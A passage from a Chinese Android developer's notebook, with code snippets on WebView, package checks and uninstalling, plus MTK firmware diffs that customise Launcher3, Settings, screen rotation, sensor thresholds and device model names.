    new AsyncLayoutInflater(MainActivity.this).inflate(R.layout.activity_main, null, new AsyncLayoutInflater.OnInflateFinishedListe() {
        @Override
        public void onInflateFinished(@NonNull View view, int i, @Nullable ViewGroup viewGroup) {
            //view：加载得到 view
            setContentView(view);
            //一系列的 findViewById(...)
        }
    });
}
```

## [webview] WebView无法调用js的修改方法

```text
webView.getSettings().setJavaScriptEnabled(true);
webView.setWebChromeClient(new WebChromeClient());

//调用 js 的方法, func 为 js 中写的方法
webView.loadUrl("javascript:"+func+"()");
```

## [webview] webView加载 url 的时候有可能还是老的网页的缓存，需要清一下apk的缓存

```text
adb shell pm clear com.mo.h5test
```

## [Snippet] 判断Activity是否存在的几种方法??

```text
一、根据包名判断应用是否存在
public boolean checkApplication(String packageName) {
    if (packageName == null || "".equals(packageName)){
        return false;
    }
    try {
        ApplicationInfo info = getPackageManager().getApplicationInfo(packageName, PackageManager.GET_UNINSTALLED_PACKAGES);
        return true;
    } catch (NameNotFoundException e) {
        return false;
    }
}

二、判断Activity是否存在
Intent intent = new Intent();
intent.setClassName("包名", "类名");

方法一：
if (getPackageManager().resolveActivity(intent, 0) == null) {
    // 说明系统中不存在这个activity
}

方法二：
if (intent.resolveActivity(getPackageManager()) == null) {
    // 说明系统中不存在这个activity
}
方法三：
List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, 0);
if (list.size() == 0) {
    // 说明系统中不存在这个activity
}
```

## 判断文件是否完整的几种方法??

```text
1，使用MD5，本地文件下载完后去文件的md5值与服务器的该文件md5进行比对，一致证明下载完全。
2，比较文件的size，文件长度，下载完成取下 File.length()，与服务器的文件长度比对，一致则下载完全。
3，文件命名法，开始下载时，把文件命名为宜别名如xxx.tmp，下载完成后再把文件名称修改过来。只要正式的文件名存在，则是下载完全的。
```

## [Snippet] 获取文件大小

```text
File apkFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/xxx.apk");
int apkSize = apkFile.length();
```

## [Snippet] PackageManager 卸载包的方法

```text
PackageManager pkgManager = mContext.getPackageManager();
// 需要system权限
PackageDeleteObserver observer = new PackageDeleteObserver(currVirus, 1);
pkgManager.deletePackage(pakName, observer, 0);

private class PackageDeleteObserver extends IPackageDeleteObserver.Stub {
    private int position;
    private int mFlag;
    public PackageDeleteObserver(int index, int flag) {
        position = index;
        mFlag = flag;// 0卸载1个包，1卸载N个包 N>1
    }
  
    @Override
    public void packageDeleted(String arg0, int arg1) throws RemoteException {
        // TODO Auto-generated method stub
        //arg0是pakname，arg1是具体没了解，卸载成功后这里是1
        LLog.e("###packageDeleted +++" + arg0 + "---" + arg1);
        Message msg;
        msg = mHandle.obtainMessage();
        msg.what = FLAG_DELETE_VIRUS;
        msg.arg1 = position;
        msg.arg2 = mFlag;
        msg.sendToTarget();
    }
}

<uses-permission android:name="android.permission.DELETE_PACKAGES" />
```

## [混淆] 混淆

```text
https://juejin.im/post/5d1717996fb9a07eeb13bc95

https://blog.csdn.net/aqi00/article/details/50773578     Android开发笔记（七十三）代码混淆与反破解
```

## [混淆] 资源文件混淆

```text
美团：修改aapt在处理资源文件相关的源码达到资源文件名的替换

微信：通过直接修改resources.arsc文件达到资源文件名的混淆    AndResGuard
```

## Android中的run-as命令引出升降权限的安全问题

```text
https://blog.csdn.net/qq_35559358/article/details/79052640
```

## Android系统修改汇总(MTK)

```text
https://blog.csdn.net/jay8824589/article/details/54912404

以下都是基于Android 8.1 的代码去修改的！！！

一、server 运行时，app退出后台，一段时间后，server被杀kill 掉了
diff --git a/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java b/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
index f348453..8e1d2ec 100644
--- a/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
+++ b/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
@@ -8596,6 +8596,10 @@ public class ActivityManagerService extends IActivityManager.Stub
     // some other background operations are not.  If we're doing a check
     // of service-launch policy, allow those callers to proceed unrestricted.
     int appServicesRestrictedInBackgroundLocked(int uid, String packageName, int packageTargetSdk) {
+        if ("com.aura.aura_go7".equals(packageName)) {
+            Slog.i(TAG, "App " + uid + "/" + packageName + " is phone app; not restricted in background");
+            return ActivityManager.APP_START_MODE_NORMAL;
+        }
         // Persistent app?
         if (mPackageManagerInt.isPackagePersistent(packageName)) {
             if (DEBUG_BACKGROUND_CHECK) {

以下都是基于Android 6.0 的代码去修改的！！！
usb storage

二十三、屏幕亮度跟踪（按power 键唤醒屏幕  较亮会闪一下bug 跟踪）
\frameworks\base\services\core\java\com\android\server\display\DisplayPowerController.java
        // Animate the screen brightness when the screen is on or dozing.
        // Skip the animation when the screen is off or suspended.
        if (!mPendingScreenOff) {
            if (state == Display.STATE_ON || state == Display.STATE_DOZE) {
                animateScreenBrightness(brightness,
                        slowChange ? BRIGHTNESS_RAMP_RATE_SLOW : mBrightnessRampRateFast);
            } else {
                animateScreenBrightness(brightness, 0);
            }
        }

   private void animateScreenBrightness(int target, int rate) {
        if (DEBUG) {
            Slog.d(TAG, "Animating brightness: target=" + target +", rate=" + rate);
        }
        if (mScreenBrightnessRampAnimator.animateTo(target, rate)) {
            try {
                mBatteryStats.noteScreenBrightness(target);
            } catch (RemoteException ex) {
                // same process
            }
        }
    }

二十二、屏幕横屏反方向
robin@ubuntu:~/workspace/SP8/SP8-2017-07-27/SP8_mtk8735$ git diff frameworks/base/core/res/res/values/config.xml
diff --git a/frameworks/base/core/res/res/values/config.xml b/frameworks/base/core/res/res/values/config.xml
index 5451540..7aa09d2 100755
--- a/frameworks/base/core/res/res/values/config.xml
+++ b/frameworks/base/core/res/res/values/config.xml
@@ -637,7 +637,7 @@
          landscape will cause a clockwise rotation, and on a landscape device an
          app requesting portrait will cause a counter-clockwise rotation.  Setting
          true here reverses that logic. -->
-    <bool name="config_reverseDefaultRotation">false</bool>
+    <bool name="config_reverseDefaultRotation">true</bool>
 

二十一、修改浏览器默认地址（Browser）
packages/apps/Browser/res/values/strings.xml
<string name="homepage_base" translatable="false">http://pldthome.com/</string>

二十、去掉SystemUI sim 卡显示ICON （Android version：7.1.1）

diff --git a/packages/SystemUI/res/values/config.xml b/packages/SystemUI/res/values/config.xml
old mode 100644
new mode 100755
index 03456c9..3873cb9
--- a/packages/SystemUI/res/values/config.xml
+++ b/packages/SystemUI/res/values/config.xml

-    <!-- The default tiles to display in QuickSettings -->
+       
+    <!-- The default tiles to display in QuickSettings  
     <string name="quick_settings_tiles_default" translatable="false">
         wifi,cell,battery,dnd,flashlight,rotation,bt,airplane
     </string>
-
-    <!-- Tiles native to System UI. Order should match "quick_settings_tiles_default" -->
+-->
+    <!-- Tiles native to System UI. Order should match "quick_settings_tiles_default"  
     <string name="quick_settings_tiles_stock" translatable="false">
         wifi,cell,battery,dnd,flashlight,rotation,bt,airplane,location,hotspot,inversion,saver,work,cast,night
     </string>
+-->
+       <!-- The default tiles to display in QuickSettings     R add 2017-7-1 15:35:52-->
+       <string name="quick_settings_tiles_default" translatable="false">
+        wifi,battery,dnd,flashlight,rotation,bt,airplane
+    </string>
 
+    <!-- Tiles native to System UI. Order should match "quick_settings_tiles_default"  -->
+    <string name="quick_settings_tiles_stock" translatable="false">
+        wifi,battery,dnd,flashlight,rotation,bt,airplane,location,hotspot,inversion,saver,work,cast,night
+    </string>

十九、修改Settings 默认打开显示开发者选项

diff --git a/src/com/android/settings/SettingsActivity.java b/src/com/android/settings/SettingsActivity.java
index 62c7b85..faf50d0 100755
--- a/src/com/android/settings/SettingsActivity.java
+++ b/src/com/android/settings/SettingsActivity.java

@@ -1276,10 +1280,13 @@ public class SettingsActivity extends Activity
     }
 
     private void updateTilesList(List<DashboardCategory> target) {
-        final boolean showDev = mDevelopmentPreferences.getBoolean(
+        // final boolean showDev = mDevelopmentPreferences.getBoolean(
+                // DevelopmentSettings.PREF_SHOW,
+                // android.os.Build.TYPE.equals("eng"));
+               /// R add 2017-3-14 09:22:33
+               final boolean showDev = mDevelopmentPreferences.getBoolean(
                 DevelopmentSettings.PREF_SHOW,
-                android.os.Build.TYPE.equals("eng"));
-
+                true);
         final UserManager um = (UserManager) getSystemService(Context.USER_SERVICE);
 
         final int size = target.size();


十八、修改 Launcher3 ICON  字体颜色
packages/apps/Launcher3$ vim res/values/styles.xml +63

    <style name="Icon.AllApps">
        <item name="android:background">@null</item>
        <item name="android:textColor">@color/quantum_panel_bg_color</item>
        <item name="android:drawablePadding">@dimen/dynamic_grid_icon_drawable_padding</item>
        <item name="android:shadowRadius">0</item>
        <item name="android:paddingLeft">4dp</item>
        <item name="android:paddingRight">4dp</item>
        <item name="customShadows">false</item>
    </style>

十七、修改系统屏方向（MTK 8735   代码6.0）

Modify screen direction for horizontal screen and power logo
diff --git a/device/hiteq/hiteq8735m_6h/ProjectConfig.mk b/device/hiteq/hiteq8735m_6h/ProjectConfig.mk
index 6f9bc55..2d7e53f 100755
--- a/device/hiteq/hiteq8735m_6h/ProjectConfig.mk
+++ b/device/hiteq/hiteq8735m_6h/ProjectConfig.mk
@@ -1,7 +1,7 @@
-BOOT_LOGO = wxga
+BOOT_LOGO = wxganl
 BUILD_KERNEL = yes
 BUILD_LK = yes
 BUILD_MD32 = no
@@ -411,7 +411,7 @@ MTK_KERNEL_POWER_OFF_CHARGING = yes
 MTK_LAUNCHER_UNREAD_SUPPORT = yes
 MTK_LCEEFT_SUPPORT = yes
 MTK_LCM_DEVICE_TREE_SUPPORT = no
-MTK_LCM_PHYSICAL_ROTATION = 0
+MTK_LCM_PHYSICAL_ROTATION = 90
 MTK_LIVEWALLPAPER_APP = yes
 MTK_LOCKSCREEN_TYPE = 0
 MTK_LOG2SERVER_APP = no
diff --git a/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_debug_defconfig b/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_debug_defconfig
old mode 100644
new mode 100755
index 8b71f3a..0373649
--- a/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_debug_defconfig
+++ b/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_debug_defconfig
@@ -214,7 +214,7 @@ CONFIG_MTK_LCM=y
 CONFIG_CUSTOM_KERNEL_LCM="ek79023_dsi_wsvga_vdo"
 CONFIG_MTK_FB=y
 CONFIG_MTK_VIDEOX=y
-CONFIG_MTK_LCM_PHYSICAL_ROTATION="0"
+CONFIG_MTK_LCM_PHYSICAL_ROTATION="90"
 CONFIG_LCM_HEIGHT="1280"
 CONFIG_LCM_WIDTH="800"
 CONFIG_MTK_DRAMC=y
diff --git a/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_defconfig b/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_defconfig
old mode 100644
new mode 100755
index 7ca6079..fbbd792
--- a/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_defconfig
+++ b/kernel-3.18/arch/arm64/configs/hiteq8735m_6h_defconfig
@@ -205,7 +205,7 @@ CONFIG_MTK_LCM=y
 CONFIG_CUSTOM_KERNEL_LCM="ek79023_dsi_wsvga_vdo"
 CONFIG_MTK_FB=y
 CONFIG_MTK_VIDEOX=y
-CONFIG_MTK_LCM_PHYSICAL_ROTATION="0"
+CONFIG_MTK_LCM_PHYSICAL_ROTATION="90"
 CONFIG_LCM_HEIGHT="1280"
 CONFIG_LCM_WIDTH="800"
 CONFIG_MTK_DRAMC=y
diff --git a/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/gt9xx_driver.c b/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/gt9xx_driver.c
old mode 100644
new mode 100755
index 32fceca..42804b3
--- a/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/gt9xx_driver.c
+++ b/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/gt9xx_driver.c
@@ -19,7 +19,7 @@
 #endif
 #include <linux/proc_fs.h>     /*proc */
 
-#define GTP_CHANGE_X2Y         0
+#define GTP_CHANGE_X2Y         1
 
 int touch_irq;
 static int tpd_flag;
diff --git a/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/include/tpd_gt9xx_common.h b/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/include/tpd_gt9xx_common.h
old mode 100644
new mode 100755
index 9a48867..a895259
--- a/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/include/tpd_gt9xx_common.h
+++ b/kernel-3.18/drivers/input/touchscreen/mediatek/GT9XXTB_hotknot/include/tpd_gt9xx_common.h
@@ -266,7 +266,7 @@ enum CHIP_TYPE_T {
 #define TPD_NO_GPIO
 #define TPD_RESET_ISSUE_WORKAROUND
 
-#define TPD_WARP_X  
+///#define TPD_WARP_X
 #define TPD_WARP_Y
 
 #ifdef TPD_WARP_X
diff --git a/kernel-3.18/drivers/misc/mediatek/accelerometer/stk8baxx/stk8baxx.c b/kernel-3.18/drivers/misc/mediatek/accelerometer/stk8baxx/stk8baxx.c
old mode 100644
new mode 100755
index 1990df9..30a7273
--- a/kernel-3.18/drivers/misc/mediatek/accelerometer/stk8baxx/stk8baxx.c
+++ b/kernel-3.18/drivers/misc/mediatek/accelerometer/stk8baxx/stk8baxx.c
@@ -1995,9 +1995,14 @@ static int STK8BAXX_ReadSensorData(struct i2c_client *client, char *buf, int buf
                acc[STK8BAXX_AXIS_X]  = acc[STK8BAXX_AXIS_X]  * GRAVITY_EARTH_1000 / obj->reso->sensitivity;
                acc[STK8BAXX_AXIS_Y]  = acc[STK8BAXX_AXIS_Y]  * GRAVITY_EARTH_1000 / obj->reso->sensitivity;
                acc[STK8BAXX_AXIS_Z]  = acc[STK8BAXX_AXIS_Z]  * GRAVITY_EARTH_1000 / obj->reso->sensitivity;              
-               
+               ///sprintf(buf, "%04x %04x %04x",  -acc[STK8BAXX_AXIS_X] , acc[STK8BAXX_AXIS_Y] , acc[STK8BAXX_AXIS_Z] );
 
-               sprintf(buf, "%04x %04x %04x",  -acc[STK8BAXX_AXIS_Y] , -acc[STK8BAXX_AXIS_X] , -acc[STK8BAXX_AXIS_Z] );
+               ///sprintf(buf, "%04x %04x %04x",  -acc[STK8BAXX_AXIS_Y] , -acc[STK8BAXX_AXIS_X] , -acc[STK8BAXX_AXIS_Z] );
+               ///sprintf(buf, "%04x %04x %04x", -acc[STK8BAXX_AXIS_X]  , -acc[STK8BAXX_AXIS_Y] , -acc[STK8BAXX_AXIS_Z] );
+               ///sprintf(buf, "%04x %04x %04x", -acc[STK8BAXX_AXIS_X]  , acc[STK8BAXX_AXIS_Y] , acc[STK8BAXX_AXIS_Z] );
+               
+               sprintf(buf, "%04x %04x %04x", acc[STK8BAXX_AXIS_X]  , -acc[STK8BAXX_AXIS_Y] , -acc[STK8BAXX_AXIS_Z] );
+               
                if(atomic_read(&obj->trace) & ADX_TRC_IOCTL)
                {
                        GSE_LOG("gsensor data: %s!\n", buf);
diff --git a/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_kernel.bmp b/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_kernel.bmp
old mode 100644
new mode 100755
index fbef98a..764997e
Binary files a/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_kernel.bmp and b/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_kernel.bmp differ
diff --git a/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_uboot.bmp b/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_uboot.bmp
old mode 100644
new mode 100755
index f2470c5..764997e
Binary files a/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_uboot.bmp and b/vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/wxganl/wxganl_uboot.bmp differ
diff --git a/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6735/boot_mode_menu.c b/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6735/boot_mode_menu.c
old mode 100644
new mode 100755
index 47f666b..608c928
--- a/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6735/boot_mode_menu.c
+++ b/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6735/boot_mode_menu.c
@@ -139,6 +139,8 @@ void boot_mode_menu_select()
                        mdelay(300);
                } else if (mtk_detect_key(MT65XX_MENU_OK_KEY)) { //VOL_DOWN,
                        //use for OK
+                       video_clean_screen();  /// R add 2017-3-15 13:47:29
+
                        break;
                } else {
                        //pass
diff --git a/vendor/mediatek/proprietary/bootable/bootloader/lk/project/hiteq8735m_6h.mk b/vendor/mediatek/proprietary/bootable/bootloader/lk/project/hiteq8735m_6h.mk
index 605a41d..01deff5 100755
--- a/vendor/mediatek/proprietary/bootable/bootloader/lk/project/hiteq8735m_6h.mk
+++ b/vendor/mediatek/proprietary/bootable/bootloader/lk/project/hiteq8735m_6h.mk
@@ -12,7 +12,7 @@ MTK_KERNEL_POWER_OFF_CHARGING = yes
 DEFINES += SWCHR_POWER_PATH
 DEFINES += MTK_BQ24296_SUPPORT
 DEFINES += MTK_BATLOWV_NO_PANEL_ON_EARLY
-MTK_LCM_PHYSICAL_ROTATION = 0
+MTK_LCM_PHYSICAL_ROTATION = 90
 CUSTOM_LK_LCM="ek79023_dsi_wsvga_vdo"
 #nt35590_hd720_dsi_cmd_auo = yes
 
@@ -22,7 +22,7 @@ MTK_VERIFIED_BOOT_SUPPORT = yes
 MTK_SEC_FASTBOOT_UNLOCK_SUPPORT = yes
 
 DEBUG := 2
-BOOT_LOGO := wxga
+BOOT_LOGO := wxganl
 
 #DEFINES += WITH_DEBUG_DCC=1
 DEFINES += WITH_DEBUG_UART=1
(END)

十六、连接USB线，隐藏 USB Storage
diff --git a/packages/apps/Settings/src/com/android/settings/deviceinfo/UsbModeChooserActivity.java b/packages/apps/Settings/src/com/android/settings/deviceinfo/UsbModeChooserActivity.java
old mode 100644
new mode 100755
index 7fad036..3310d1a
--- a/packages/apps/Settings/src/com/android/settings/deviceinfo/UsbModeChooserActivity.java
+++ b/packages/apps/Settings/src/com/android/settings/deviceinfo/UsbModeChooserActivity.java
@@ -44,7 +44,7 @@ public class UsbModeChooserActivity extends Activity {
         UsbBackend.MODE_POWER_SINK | UsbBackend.MODE_DATA_PTP,
         UsbBackend.MODE_POWER_SINK | UsbBackend.MODE_DATA_MIDI,
         /// M: Add for Built-in CD-ROM and USB Mass Storage @{
-        UsbBackend.MODE_POWER_SINK | UsbBackend.MODE_DATA_MASS_STORAGE,
+        /// R: hide ----> UsbBackend.MODE_POWER_SINK | UsbBackend.MODE_DATA_MASS_STORAGE,
         UsbBackend.MODE_POWER_SINK | UsbBackend.MODE_DATA_BICR
         /// M: @}
     };

十五、launcher 切换语言 退回到 all app 界面 ，桌面与all app 界面重叠
diff --git a/packages/apps/Launcher3/src/com/android/launcher3/LauncherStateTransitionAnimation.java b/packages/apps/Launcher3/src/com/android/launcher3/LauncherStateTransitionAnimation.java
index cdde8c1..be4b9f7 100755
--- a/packages/apps/Launcher3/src/com/android/launcher3/LauncherStateTransitionAnimation.java
+++ b/packages/apps/Launcher3/src/com/android/launcher3/LauncherStateTransitionAnimation.java
@@ -386,6 +386,8 @@ public class LauncherStateTransitionAnimation {
             toView.setVisibility(View.VISIBLE);
             toView.bringToFront();
 
+            fromView.setVisibility(View.INVISIBLE);
+            
             // Show the content view
             contentView.setVisibility(View.VISIBLE);

十四、将桌面workspace、hotseat 大小调整 放大一半 ，这个要根据自己的需求来制定
workspace.setPadding(padding.left/2, padding.top/2, padding.right/2, padding.bottom);
hotseat.setPadding(edgeMarginPx + padding.left/2, 0, edgeMarginPx + padding.right/2, 2 * edgeMarginPx);


十三、隐藏Launcher3 桌面界面上面的搜索栏 
packages\apps\Launcher3\src\com\android\launcher3\Launcher.Java
//mSearchDropTargetBar.addView(mQsb); 注释掉这一行 就行


十二、修改Launcher3 appall app菜单列表背景透明度
\packages\apps\Launcher3\src\com\android\launcher3\allapps\AllAppsContainerView.java
mContainerView.setBackground(background);
//mRevealView.setBackground(background.getConstantState().newDrawable());
mAppsRecyclerView.updateBackgroundPadding(bgPadding);
mAdapter.updateBackgroundPadding(bgPadding);
mContainerView.getBackground().setAlpha(20);
packages\apps\Launcher3\src\com\android\launcher3\op09\AllAppsContainerView.java
mContainerView.setBackground(null);
//mRevealView.setBackground(background.getConstantState().newDrawable());

十一、长按电源键只显示关机一项
我们知道长按Power键会弹出选项，如 关机、 重启、飞行模式。现在想只保留一项  关机 ；
frameworks/base/core/res/res/values/config.xml
搜索 config_globalActionsList 
    <string-array translatable="false" name="config_globalActionsList">
        <item>power</item>
    </string-array>
以下是参考 ，需要添加的放在上面这个数组里面就是了  ：
<item>power</item>关机选项
<item>bugreport</item>错误报告选项
<item>airplane</item>飞行模式选项
<item>silent</item>静音振动铃声选项
<item>restart</item>重启选项
<item>reboot</item>//新增重启功能  
<item>settings</item>设置选项
<item>lockdown</item>锁屏选项
<item>screencapture</item>截图、录制选项
<item>users</item>用户选项

十、无法写入sn号，需要把这个 宏 打开,这个去掉注释,让写的barcode生效,barcode就是SN,不然都是默认的 0123456789ABCDEF
vendor/mediatek/proprietary/bootable/bootloader/lk/app/mt_boot/mt_boot.c
/* #define SERIAL_NUM_FROM_BARCODE */

九、launcher  focus_indicator 桌面 页面 显示表示 （就是桌面上那小白点），在设置系统字体大小后和在app_app界面屏幕旋转 回到all_app 界面会显示出来 ，bug，让它不显示：

+++ b/packages/apps/Launcher3/src/com/android/launcher3/Launcher.java
@@ -138,6 +138,10 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicInteger;
+import android.hardware.SensorManager;
+
+import android.content.pm.ResolveInfo;
+import android.os.IBinder;
 
 /**
  * Default launcher application.   onCreate()里面添加
@@ -656,7 +660,47 @@ public class Launcher extends Activity
             showFirstRunActivity();
             showFirstRunClings();
         }
+
+               IntentFilter mInrentFilter = new IntentFilter() ;
+        mInrentFilter.addAction("android.intent.action.CONFIGURATION_CHANGED");
+        registerReceiver(screenOrientationChangedReceiver,mInrentFilter) ;
+               
+               mOrientationListener = new OrientationEventListener(this,
+                SensorManager.SENSOR_DELAY_NORMAL) {
+                               @Override
+                               public void onOrientationChanged(int orientation) {
+                               }
+                       };
+
+                       if (mOrientationListener.canDetectOrientation()) {
+                               setPageIndicatorVisble();
+                               mOrientationListener.enable();
+                       } else {
+                               setPageIndicatorVisble();
+                               mOrientationListener.disable();
+                       }
     }
+       
+       /// R add hide Visble ndicator ///#Switching language#Screen rotation/// 2017-3-2 09:34:26
+       private void setPageIndicatorVisble(){
+               if(isAppsViewVisible()){
+                       if (mPageIndicators != null){
+                               mPageIndicators.setAlpha(0f);
+                       }
+               } else {
+                       if (mPageIndicators != null) {
+                               mPageIndicators.setAlpha(1f);
+                       }
+               }
+       }
+       
+       /// R add Monitor#Screen rotation/// 2017-3-2 09:34:32
+       private BroadcastReceiver screenOrientationChangedReceiver=new BroadcastReceiver() {
+                       @Override 
+                       public void onReceive(Context context, Intent intent) {
+                               setPageIndicatorVisble();
+                       }
+    };
 
     @Override
     public void onSettingsChanged(String settings, boolean value) {
@@ -2344,6 +2388,7 @@ public class Launcher extends Activity
         if (mLauncherCallbacks != null) {
             mLauncherCallbacks.onDestroy();
         }
+               unregisterReceiver(screenOrientationChangedReceiver);
     }
 
     public DragController getDragController() {
@@ -5468,6 +5513,7 @@ public class Launcher extends Activity
         }
         return false;
     }
 }
diff --Git a/packages/apps/Launcher3/AndroidManifest.xml b/packages/apps/Launcher3/AndroidManifest.xml
index a3d5ec0..20e7d4d 100755
--- a/packages/apps/Launcher3/AndroidManifest.xml
+++ b/packages/apps/Launcher3/AndroidManifest.xml
@@ -68,6 +68,7 @@
     <uses-permission android:name="com.android.launcher3.permission.WRITE_SETTINGS" />
     <uses-permission android:name="com.android.launcher3.permission.RECEIVE_LAUNCH_BROADCASTS" />
     <uses-permission android:name="com.android.launcher3.permission.RECEIVE_FIRST_LOAD_BROADCAST" />
+       <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
     <!-- M: hide apps activity requires this permission to get package size. -->
     <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
     <!-- M: ALSP02141215, android security patch. -->

八、Workspace 界面大小修改；hotseat 界面大小修改
diff --git a/packages/apps/Launcher3/src/com/android/launcher3/DeviceProfile.java b/packages/apps/Launcher3/src/com/android/launcher3/DeviceProfile.java
index ebb19cc..0ed0ad0 100755
--- a/packages/apps/Launcher3/src/com/android/launcher3/DeviceProfile.java
+++ b/packages/apps/Launcher3/src/com/android/launcher3/DeviceProfile.java
@@ -414,7 +414,7 @@ public class DeviceProfile {
         lp.gravity = Gravity.CENTER;
         Rect padding = getWorkspacePadding(isLayoutRtl);
         workspace.setLayoutParams(lp);
-        workspace.setPadding(padding.left, padding.top, padding.right, padding.bottom);
+        workspace.setPadding(padding.left/2, padding.top/2, padding.right/2, padding.bottom);
         workspace.setPageSpacing(getWorkspacePageSpacing(isLayoutRtl));
 
         // Layout the hotseat
@@ -432,8 +432,8 @@ public class DeviceProfile {
             lp.gravity = Gravity.BOTTOM;
             lp.width = LayoutParams.MATCH_PARENT;
             lp.height = hotseatBarHeightPx;
-            hotseat.setPadding(edgeMarginPx + padding.left, 0,
-                    edgeMarginPx + padding.right,
+            hotseat.setPadding(edgeMarginPx + padding.left/2, 0,
+                    edgeMarginPx + padding.right/2,
                     2 * edgeMarginPx);
         } else {

七、修改盘符名称信息、型号信息
index b20ecaa..f92828b 100755
--- a/device/hiteq/hiteq8783_tb_m/full_hiteq8783_tb_m.mk
+++ b/device/hiteq/hiteq8783_tb_m/full_hiteq8783_tb_m.mk
@@ -55,7 +55,7 @@ TRUSTY_PROJECT ?= hiteq8783_tb_m
 #CHIVIN
 
 PRODUCT_BRAND := GP8PRO
-CHIVIN_PRODUCT := GP8_PRO
+CHIVIN_PRODUCT := Aura_TELPAD_GP8_PRO_tablet
 CHIVIN_VERSION := GP8_PRO_V01.00.01    #micheal modify version
 
 #CHIVIN
diff --git a/packages/apps/Settings/src/com/android/settings/DeviceInfoSettings.Javab/packages/apps/Settings/src/com/android/settings/DeviceInfoSettings.java
index a964aed..bf11928 100755
--- a/packages/apps/Settings/src/com/android/settings/DeviceInfoSettings.java
+++ b/packages/apps/Settings/src/com/android/settings/DeviceInfoSettings.java
@@ -134,7 +134,7 @@ public class DeviceInfoSettings extends SettingsPreferenceFragment implements In
         findPreference(KEY_BUILD_NUMBER).setEnabled(true);
         findPreference(KEY_KERNEL_VERSION).setSummary(getFormattedKernelVersion());
                
-               findPreference(KEY_DEVICE_MODEL).setSummary("Aura_TELPAD-GP8-PRO-tablet");
+               findPreference(KEY_DEVICE_MODEL).setSummary(SystemProperties.get("ro.product.model"));
                
         if (!SELinux.isSELinuxEnabled()) {
             String status = getResources().getString(R.string.selinux_status_disabled);
@@ -155,7 +155,7 @@ public class DeviceInfoSettings extends SettingsPreferenceFragment implements In
         // Remove Equipment id preference if FCC ID is not set by RIL
         removePreferenceIfPropertyMissing(getPreferenceScreen(), KEY_EQUIPMENT_ID,
                 PROPERTY_EQUIPMENT_ID);
diff --git a/frameworks/av/media/mtp/MtpServer.cpp b/frameworks/av/media/mtp/MtpServer.cpp
index 470d6ca..91eb0c9 100755
--- a/frameworks/av/media/mtp/MtpServer.cpp
+++ b/frameworks/av/media/mtp/MtpServer.cpp
@@ -500,7 +500,7 @@ MtpResponseCode MtpServer::doGetDeviceInfo() {
 
     property_get("ro.product.model", prop_value, "MTP Device");
     //string.set(prop_value);
-       string.set("Aura_GP8_PRO_tablet"); ///R add 2017-2-27 21:38:22
+       string.set("Aura_SP8_PRO_tablet"); ///R add 2017-2-27 21:38:22   盘符名称
     mData.putString(string);   // Model
     string.set("1.0");
     mData.putString(string);   // Device Version

六、修改距离感应的阈值Update-hiteq8783_tb_m.dts-threshold
diff --git a/kernel-3.18/arch/arm64/boot/dts/hiteq8783_tb_m.dts b/kernel-3.18/arch/arm64/boot/dts/hiteq8783_tb_m.dts
index 7ac604a..ea78285 100644
--- a/kernel-3.18/arch/arm64/boot/dts/hiteq8783_tb_m.dts
+++ b/kernel-3.18/arch/arm64/boot/dts/hiteq8783_tb_m.dts
@@ -1,4 +1,3 @@
-
 /dts-v1/;
 
 #include "mt6753.dtsi"
@@ -92,8 +91,8 @@ memory@00000000 {
                power_vol = <0>;
                als_level = <1 2 5 10 20 30 40 80 200 300 400 600 1000 1600 2000>;
                als_value = <80 400 800 1200 1800 2000 2300 2300 12000 12000 12000 48000 48000 72000 81920 81920>;
-               ps_threshold_high =  <90>;
-               ps_threshold_low =  <70>;
+               ps_threshold_high =  <300>;
+               ps_threshold_low =  <140>;
                is_batch_supported_ps   = <0>;
                is_batch_supported_als  = <0>;
        };
注：值比ps_threshold_high 高，黑屏，值比ps_threshold_low  低，亮屏
  通话界面 为避免 脸部贴近屏幕 而 设计 黑屏 ，是最好的列子。

五、闹钟中的倒计时；设置1秒后；当到达设定的时间后；要超过4秒作用才会提示响铃提醒；设2秒倒计时就会3秒提示；设3秒就2秒提示；5秒后；即时提示；
index c7bf61c..170b536 100755
--- a/packages/apps/DeskClock/src/com/android/deskclock/timer/TimerFragment.java
+++ b/packages/apps/DeskClock/src/com/android/deskclock/timer/TimerFragment.java
@@ -123,6 +123,13 @@ public class TimerFragment extends DeskClockFragment implements OnSharedPreferen
             final boolean visible = Utils.getTimeNow() % TIME_PERIOD_MS < SPLIT;
             final boolean toggle = mVisible != visible ;
             mVisible = visible;
+                       
